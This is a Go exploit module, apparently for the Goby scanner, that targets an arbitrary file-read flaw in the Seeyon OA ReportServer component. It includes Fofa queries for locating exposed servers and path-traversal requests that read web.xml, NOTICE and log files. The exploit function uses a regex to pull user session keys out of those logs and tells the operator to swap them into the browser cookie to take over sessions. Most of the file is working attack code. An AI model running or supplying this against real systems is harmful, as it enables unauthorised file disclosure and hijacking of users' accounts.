package exploits

import (
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Seeyon arbitrary file reading can lead to user session reading",
    "Description": "<p>Seeyon OA office automation software is used for the development and sale of OA office automation software. 2010, UFIDA Zhiyuan changed its name to Zhiyuan Xiechuang.</p><p>There is an arbitrary file reading vulnerability in Zhiyuan OA FanSoft component.</p>",
    "Product": "Seeyon",
    "Homepage": "https://www.seeyon.com/",
    "DisclosureDate": "2022-04-05",
    "Author": "Mars",
    "FofaQuery": "(body=\"/seeyon/main.do\" && body=\"/seeyon/common/\") || server==\"SY8045\" || server==\"SY8044\"",
    "GobyQuery": "(body=\"/seeyon/main.do\" && body=\"/seeyon/common/\") || server==\"SY8045\" || server==\"SY8044\"",
    "Level": "3",
    "Impact": "<p>The vulnerability can lead to unauthorized reading of arbitrary files on the server, which can be used to obtain user sessions by reading logs, resulting in the acquisition of user privileges.</p>",
    "Recommendation": "<p>Contact the officials to upgrade the latest components <a href=\"https://www.seeyon.com/\">https://www.seeyon.com/</a></p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "file",
            "type": "input",
            "value": "../../../../logs_sy/form.log"
        },
        {
            "name": "tips",
            "type": "textarea",
            "value": "可以读session的日志名称:rest.log、quartz.log、login.log、ctp.log",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "input",
        "Content": "可以读session的日志名称:rest.log、quartz.log、login.log、ctp.log,关键字为session key"
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/seeyonreport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=../../../../NOTICE",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": " javaee_(\\w{1,8})",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "not contains",
                        "value": "出错页面",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/seeyonreport/ReportServer?op=chart&cmd=get_geo_json&resourcepath={{{file}}}",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "SetVariable": [
                "output|lastbody||"
            ],
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "not contains",
                        "value": "出错页面",
                        "bz": ""
                    }
                ]
            }
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "10",
    "Translation": {
        "CN": {
            "Name": "致远 OA 协同办公系统 ReportServer 文件 resourcepath 参数任意文件读取",
            "Product": "致远互联-OA",
            "Description": "<p>致远OA办公自动化软件， 用于OA办公自动化软件的开发销售。2010年，用友致远更名为致远协创。<br></p><p>致远OA帆软组件存在任意文件读取漏洞，攻击者可通过该漏洞读取泄露源码、数据库配置文件等等，导致攻击者读取日志文件获取用户session。</p>",
            "Recommendation": "<p>联系官方升级最新的组件<a href=\"https://www.seeyon.com/\">https://www.seeyon.com/</a><br></p>",
            "Impact": "<p>致远OA帆软组件存在任意文件读取漏洞，攻击者可通过该漏洞读取泄露源码、数据库配置文件等等，导致攻击者读取日志文件获取用户session。</p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Seeyon arbitrary file reading can lead to user session reading",
            "Product": "Seeyon",
            "Description": "<p>Seeyon OA office automation software is used for the development and sale of OA office automation software. 2010, UFIDA Zhiyuan changed its name to Zhiyuan Xiechuang.</p><p>There is an arbitrary file reading vulnerability in Zhiyuan OA FanSoft component.</p>",
            "Recommendation": "<p>Contact the officials to upgrade the latest components <a href=\"https://www.seeyon.com/\">https://www.seeyon.com/</a><br></p>",
            "Impact": "<p>The vulnerability can lead to unauthorized reading of arbitrary files on the server, which can be used to obtain user sessions by reading logs, resulting in the acquisition of user privileges.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10685"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			requestConfig := httpclient.NewGetRequestConfig("/seeyonreport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=../../../seeyon/WEB-INF/web.xml")
			requestConfig.VerifyTls = false
			requestConfig.FollowRedirect = false
			requestConfig.Timeout = 15
			response, _ := httpclient.DoHttpRequest(u, requestConfig)
			requestConfig1 := httpclient.NewGetRequestConfig("/seeyonreport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=../../../../NOTICE")
			requestConfig1.VerifyTls = false
			requestConfig1.FollowRedirect = false
			requestConfig1.Timeout = 15
			response1, _ := httpclient.DoHttpRequest(u, requestConfig1)
			if response.StatusCode == 200 && strings.Contains(response.RawBody,"SEEYON CTP") && (strings.Contains(response.RawBody,"ImageIO service provider loader/unloader"))  {
				if response1.StatusCode == 200 && strings.Contains(response1.RawBody,"The Windows Installer is built with the Nullsoft")&& strings.Contains(response1.RawBody,"The original software and related information is available at") {
					return true
				}
				return false
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			r, _ := regexp.Compile(`session key : (\w{8})-(\w{4})-(\w{4})-(\w{4})-(\w{12})`)
			requestConfig := httpclient.NewGetRequestConfig("/seeyonreport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=" + ss.Params["file"].(string))
			requestConfig.VerifyTls = false
			requestConfig.FollowRedirect = false
			requestConfig.Timeout = 15
			response, _ := httpclient.DoHttpRequest(expResult.HostInfo, requestConfig)
			if response.StatusCode == 200 && !strings.Contains(response.RawBody, "错误页面") {
				out := strings.Join(r.FindAllString(response.RawBody, -1), "</br>")
				expResult.Success = true
				expResult.OutputType = "html"
				expResult.Output = "替换浏览器cookie</br>[+]session列表:" + out + "</br>" +"返回包信息：</br>"+ response.RawBody
			}
			return expResult
		},
	))
}
